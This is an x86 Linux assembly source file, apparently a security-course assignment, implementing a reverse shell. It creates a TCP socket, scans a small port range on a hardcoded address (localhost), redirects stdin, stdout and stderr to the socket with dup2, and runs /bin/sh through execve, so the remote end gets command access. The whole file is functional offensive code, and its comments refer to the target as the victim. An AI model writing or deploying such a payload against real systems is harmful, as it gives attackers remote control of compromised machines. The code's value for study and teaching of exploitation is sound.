; NOM / Prénom : NEHME Ali
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;

section .data
    bin_sh db '/bin/sh'
    len_bin_sh equ $ - bin_sh

    IP_ADDR equ 0x0100007f      ; ip convertit au bon format (inversé)
    PORT_ADDR equ 3005          ; port (non convertit)
    TRY_TO_FIND_PORT equ 0xf    ; permet de limiter le nombre de try

section .text
    global _start

_rol_port:
    rol bx, 8
    jmp _rol_port_end


; eax : ip
; ebx : port
;; Permet de construire la structure sock_addr en reformatant
;; l'IP et le port.
;; @Return void. La structure est stockée dans la stack (en guise de pointeur)
;; La valeur est stocké à son tour dans le registre ECX.
_struct_sockaddr:
    mov eax, IP_ADDR
    mov ebx, PORT_ADDR
    add ebx, esi
    jmp _rol_port
    _rol_port_end:
        push IP_ADDR    ; port
        push word bx    ; port convertit à partir de "htons"
        push word 0x2   ; AF_INET
        mov ecx, esp
    jmp _end_struct_sockaddr

;; Permet de se connecter à une socket si trouvé.
;; Cette "fonction" permet aussi de scanner à partir 
;; du paramètre "TRY_TO_FIND_PORT", une intervalle de port 
;; commençant par "PORT_ADDR".
_connect_to_ip_port:
    xor esi, esi
    _while_port_scanning:
        jmp _struct_sockaddr ; Struct sockaddr *addr
        _end_struct_sockaddr: 
            mov eax, 0x16a  ; connect
            mov ebx, edi    ; socket_fd (socket créé)
            mov ecx, esp    ; Struct sockaddr *addr
            mov edx, 0x10   ; size de sockaddr *addr
            int 0x80

            cmp eax, 0      ; si il n'y a pas d'erreur, la connection a eut lieu.
            jne _port_used  ; jump si le retour n'est pas zéro, chercher encore.
            jmp _end_connect_to_ip_port
            _port_used:
                inc esi
                cmp esi, TRY_TO_FIND_PORT   ; Si il y a encore des "try", continuer dans le while sinon, quitter le programme.
                jle _while_port_scanning
                jmp _no_port_to_connect_to_ip

_start:
    ;; Création de la socket
    mov eax, 0x167  ; socket 
    mov ebx, 2      ; domaine : AF_INET (IPv4)
    mov ecx, 1      ; type : SOCK_STREAM (TCP)
    mov edx, 0      ; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    int 0x80

    mov edi, eax    ; On conserve la socket dans edi

    ;; Connection à la victime + scan des ports
    jmp _connect_to_ip_port
    _end_connect_to_ip_port:

    ;; Dup2 (duplication) pour stdin (redirige la stdin de la victime vers ma machine)
    mov eax, 0x3f   ; dup2
    mov ebx, edi    ; socket de la victime (connexion)
    mov ecx, 0x0    ; stdin
    int 0x80

    ;; Dup2 (duplication) pour stdout
    mov eax, 0x3f   ; dup2
    mov ebx, edi    ; socket de la victime (connexion)
    mov ecx, 0x1    ; stdout
    int 0x80

    ;; Dup2 (duplication) pour stderr
    mov eax, 0x3f   ; dup2
    mov ebx, edi    ; socket de la victime (connexion)
    mov ecx, 0x2    ; stderr
    int 0x80

    ;; execve("/bin/sh", 0, 0)
    mov eax, 0x0b   ; execv
    mov ebx, bin_sh ; La string "/bin/sh"
    mov ecx, 0x0    ; pas d'argument pour le shell
    mov edx, 0x0    ; pas d'argument pour le shell
    int 0x80

    ;; Exit avec un 0 (tout s'est bien passé)
    mov eax, 1
    mov ebx, 0
    int 0x80

    _no_port_to_connect_to_ip:
        mov eax, 1
        mov ebx, 1
        int 0x80
